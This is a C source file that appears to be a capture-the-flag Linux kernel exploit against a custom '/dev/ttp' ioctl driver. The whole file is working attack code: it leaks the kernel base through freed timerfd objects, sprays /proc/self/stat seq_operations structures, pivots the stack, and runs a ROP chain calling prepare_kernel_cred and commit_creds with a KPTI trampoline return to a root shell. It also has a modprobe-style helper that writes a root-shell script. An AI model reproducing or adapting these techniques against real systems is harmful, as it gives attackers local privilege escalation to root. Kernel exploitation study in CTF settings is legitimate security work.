#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/timerfd.h>
#include <signal.h>
#include <sys/mman.h>

// commands
#define DEV_PATH "/dev/ttp"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

// utils
#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define ulong unsigned long
#define scu static const unsigned long
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

static void print_hex8(void* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static void shell_modprobe()
{
    system("echo '#!/bin/sh' > /home/user/hax; echo 'setsid cttyhack setuidgid 0 \
           /bin/sh' >> /home/user/hax");
    system("chmod +x /home/user/hax");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/roooot");
    system("chmod +x /home/user/roooot");
    system("/home/user/roooot");
}

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

uint64_t user_cs,user_ss,user_sp,user_rflags;
static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}


#define TTP_CREATE 0x40087401
#define TTP_DELETE 0x40087402
#define TTP_EDIT   0x40087403
#define TTP_GET    0x40087404

typedef struct {
    size_t idx;
    size_t len;
    uint8_t* buf;
} req_t;

static void create(int fd, size_t idx)
{
    if (ioctl(fd, TTP_CREATE, idx) < 0) {
        perror("create");
        exit(-1);
    }
}

static void delete(int fd, size_t idx)
{
    if (ioctl(fd, TTP_DELETE, idx) < 0) {
        perror("delete");
        exit(-1);
    }
}

static void edit(int fd, size_t idx, uint8_t* buf, size_t len)
{
    req_t req = {0};
    req.idx = idx;
    req.len = len;
    req.buf = buf;

    if (ioctl(fd, TTP_EDIT, &req) < 0) {
        perror("edit");
        exit(-1);
    }
}

static void get(int fd, size_t idx, uint8_t* buf, size_t len)
{
    req_t req = {0};
    req.idx = idx;
    req.len = len;
    req.buf = buf;

    if (ioctl(fd, TTP_GET, &req) < 0) {
        perror("edit");
        exit(-1);
    }
}

static int create_timer(int leak)
{
  struct itimerspec its;

  its.it_interval.tv_sec = 0;
  its.it_interval.tv_nsec = 0;
  its.it_value.tv_sec = 2;
  its.it_value.tv_nsec = 0;

  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  timerfd_settime(tfd, 0, &its, 0);

  if (leak)
  {
    close(tfd);
    sleep(1);
    return 0;
  }
}

static void get_shell()
{
    puts("test");
    if (!getuid())
	{
		puts("Got r00t :)");
		system("/bin/sh");
	}
	exit(0);
}

uint64_t user_rip = (uint64_t)get_shell;
uint64_t k_base;
// mov rsp, qword ptr [rsp] ; pop rbp ; ret
uint64_t mov_rsp_ptr;
// mov esp, edx ; fld dword ptr [rax] ; pop rbp ; ret
uint64_t mov_rsp_val;
uint64_t kpti_tramp;
uint64_t prepare_kernel_cred;
uint64_t commit_creds;
uint64_t pop_rdi_ret;
uint64_t pop_rsi_ret;
// cmp rcx, rsi ; mov rdi, rax ; ja 0xffffffff81532ddd ; pop rbp ; ret
uint64_t mov_rdi_rax_pop1;
uint64_t iretq;
uint64_t swapgs_pop1;
int fd;
uint8_t buf[0x120];
int stat_fds[0x400];
void* rop_buf;

void allocate_fds(unsigned amount)
{
    for (unsigned i = 0; i < amount; i++) {
        stat_fds[i] = open("/proc/self/stat", O_RDONLY);
        if (stat_fds[i] < 0) {
            perror("open");
            exit(-1);
        }
    }
}

void free_fds(unsigned amount)
{
    for (unsigned i = 0; i < amount; i++) {
        int ret = close(stat_fds[i]);
        if (ret < 0) {
            perror("close");
            exit(-1);
        }
    }
}

void read_fds(unsigned amount)
{
    uint8_t buf[0x10] = {0};
    for (int i = 0; i < amount; i++) {
        read(stat_fds[i], buf, 1);
    }
}

void allocate_ttps(unsigned amount)
{
    for (unsigned i = 0; i < amount; i++) {
        create(fd, i);
    }
}

void edit_ttps(unsigned amount)
{
    uint64_t mask = 0xffffffff00000000;
    uint8_t tmp[0x120] = {0};
    uint64_t* p_tmp = (uint64_t*)tmp;
    for (unsigned i = 0; i < amount; i++) {
        get(fd, i, tmp, sizeof(tmp));

        if (p_tmp[32] > mask && p_tmp[33] > mask && p_tmp[34] > mask
                && p_tmp[35] > mask) {
          printf("%p %p %p %p \n", p_tmp[32], p_tmp[33], p_tmp[34], p_tmp[35]);
          edit(fd, i, buf, sizeof(buf)-0x10);
          break;
        }
    }
}

void free_ttps(unsigned amount)
{
    for (unsigned i = 0; i < amount; i++) {
        delete(fd, i);
    }
}


void interleaf_allocate(unsigned a, unsigned b)
{
    for (unsigned i = 0; i < a; i++) {
        stat_fds[i] = open("/proc/self/stat", O_RDONLY);
        if (stat_fds[i] < 0) {
            perror("open");
            exit(-1);
        }

        if (i < b) {
            create(fd, i);
        }
    }
}

static void build_rop(uint64_t* p_rop_buf, unsigned off)
{
    p_rop_buf[off++] = 0xdeadbeef;
    p_rop_buf[off++] = pop_rdi_ret;
    p_rop_buf[off++] = 0x0;
    p_rop_buf[off++] = prepare_kernel_cred;
    p_rop_buf[off++] = pop_rsi_ret;
    p_rop_buf[off++] = 0xffffffffffffffff;
    p_rop_buf[off++] = mov_rdi_rax_pop1;
    p_rop_buf[off++] = 0x0;
    p_rop_buf[off++] = commit_creds;
    p_rop_buf[off++] = kpti_tramp + 22;
    p_rop_buf[off++] = 0x0;
    p_rop_buf[off++] = 0x0;
    /*
    p_buf[off++] = swapgs_pop1;
    p_buf[off++] = 0;
    p_buf[off++] = iretq;
    */
    save_state();
    p_rop_buf[off++] = user_rip;
    p_rop_buf[off++] = user_cs;
    p_rop_buf[off++] = user_rflags;
    p_rop_buf[off++] = user_sp;
    p_rop_buf[off++] = user_ss;
    p_rop_buf[off++] = 0xdeadbeef;
}

// max idx = 0x3ff, max sz = 0x120
int main(void)
{
    fd = open(DEV_PATH, O_RDONLY);

    signal(SIGSEGV,get_shell);

    rop_buf = mmap((void*)(0xe58948c0 & ~0xFFF), 4*PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

    memset(rop_buf, 0x90, 2240);

    if (fd < 0) {
        perror("open");
        return -1;
    }

    for (int i = 0; i < 0x3; i++) {
        create(fd, i);
    }

    delete(fd, 2);
    create_timer(1);
    create(fd, 2);

    uint64_t* p_buf = (uint64_t*)buf;

    get(fd, 2, buf, sizeof(buf));
    k_base = p_buf[0x5] - 0x3370e0;
    mov_rsp_ptr = k_base + 0x93312;
    mov_rsp_val = k_base + 0x62a71;
    kpti_tramp = k_base + 0xc00a34;
    prepare_kernel_cred = k_base + 0xccc80;
    commit_creds = k_base + 0xcc910;
    pop_rdi_ret = k_base + 0x8e2f0;
    pop_rsi_ret = k_base + 0x13acbe;
    mov_rdi_rax_pop1 = k_base + 0x532dec;
    iretq = k_base + 0x39e6b;
    swapgs_pop1 = k_base + 0x77524;

    printf("Kernel base: %p \n", k_base);
    printf("mov_rsp_val: %p \n", mov_rsp_val);
    printf("pop_rdi_ret: %p \n", pop_rdi_ret);
    printf("kpti tramp: %p \n", kpti_tramp);
    printf("Return to: %p \n", get_shell);

    for (int i = 0; i < 0x3; i++) {
        delete(fd, i);
    }

    build_rop((uint64_t*)rop_buf, 2240 / 8);

    // stack pivot
    printf("Rop buf: %p \n", rop_buf);
    p_buf[32] = rop_buf;
    // mov esp, 0xe58948c0 ; pop rbp ; ret
    p_buf[32] = k_base + 0x529c97;
    p_buf[33] = mov_rsp_val;

    for (;;) {
        interleaf_allocate(0x300, 0x200);

        edit_ttps(0x200);
        read_fds(0x300);

        free_fds(0x300);
        free_ttps(0x200);

        puts("free");
    }

    return 0;
}
